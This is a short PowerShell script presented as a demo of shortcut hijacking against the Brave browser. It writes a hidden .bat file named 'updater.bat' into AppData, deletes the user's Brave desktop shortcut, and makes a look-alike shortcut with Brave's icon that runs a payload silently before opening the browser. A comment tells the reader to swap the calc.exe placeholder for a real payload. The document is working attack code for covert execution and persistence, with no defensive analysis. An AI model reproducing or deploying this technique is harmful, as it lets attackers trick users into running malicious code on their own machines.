# ----------------------------------------------------
# Demo: Shortcut Hijacking with Hidden .BAT Wrapper
# ----------------------------------------------------

# Payload path (the executable to run first)
$payload = "C:\Users\test\Desktop\calc.exe"   # --> Replace calc.exe with your real payload

# Path to the real Brave browser executable
$brave  = "C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"

# Location of the hidden .bat file (stored inside AppData\Microsoft\Windows)
$batPath = "$env:APPDATA\Microsoft\Windows\updater.bat"

# ----------------------------------------------------
# Step 1: Create hidden .bat file
# ----------------------------------------------------
# This .bat launches the payload first, then Brave browser.
@"
start "" "$payload"
start "" "$brave"
"@ | Out-File -FilePath $batPath -Encoding ASCII -Force

# Hide the .bat file so it doesn’t appear normally in Explorer
attrib +h $batPath

# ----------------------------------------------------
# Step 2: Define shortcut path
# ----------------------------------------------------
# This is where the Brave shortcut will be replaced/created
$shortcut = "C:\Users\test\Desktop\Brave.lnk"

# If the old Brave shortcut exists, remove it
if (Test-Path $shortcut) {
    Remove-Item $shortcut -Force
}

# ----------------------------------------------------
# Step 3: Create new Brave shortcut
# ----------------------------------------------------
# New shortcut points to the hidden .bat file, but uses Brave’s icon
$ws = New-Object -ComObject WScript.Shell
$sc = $ws.CreateShortcut($shortcut)
$sc.TargetPath = $batPath
$sc.IconLocation = "C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe,0"
$sc.Save()

# ----------------------------------------------------
# Result:
# 1. User double-clicks the Brave shortcut.
# 2. Payload (calc.exe in this demo) runs first.
# 3. Brave browser launches right after.
# 4. Shortcut looks identical to real Brave (icon/name).
# ----------------------------------------------------
